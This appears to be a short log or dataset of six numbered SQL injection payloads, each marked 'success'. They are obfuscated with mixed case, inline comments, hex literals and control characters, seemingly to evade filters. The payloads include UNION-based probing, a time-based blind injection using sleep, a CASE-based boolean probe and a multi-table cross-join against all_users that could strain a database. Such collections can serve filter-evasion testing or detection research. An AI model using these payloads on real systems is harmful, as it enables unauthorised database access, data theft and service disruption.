1137 success "select/**/count  (  *  )\n  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 &&   (  'wweo'  =  'wweo "
1139 success "(SElect 1)' wHERE 2525 NOT LIKE 2526 union all seLeCt null,null-- "
1140 success ' end &&    (    (   "%"/**/ =  " '
1141 success "0x1'  )   as nftr where ','=',' or   (  SelECt * frOm   (  sElECT  (  sleep  (  0x5   )    )     )  sddo  )  # "
1144 success ' sElECT * FROM\x0cusers wheRE id/**/  liKe   1 Or "? \n(  " OR 1   LIKE /**/ 0x1 -- (SELECT 0x1) '
1145 success '0x1"  )   rlike   (  select   (\n\x0ccase when   (  0x1672 /*c\rX*/=  (SELECT (SELECT 5367))  )   then (SELECT 1) else 0x28 end   )    )    and  /*hV\t7k*/(  "hnnf" like "hnnf '
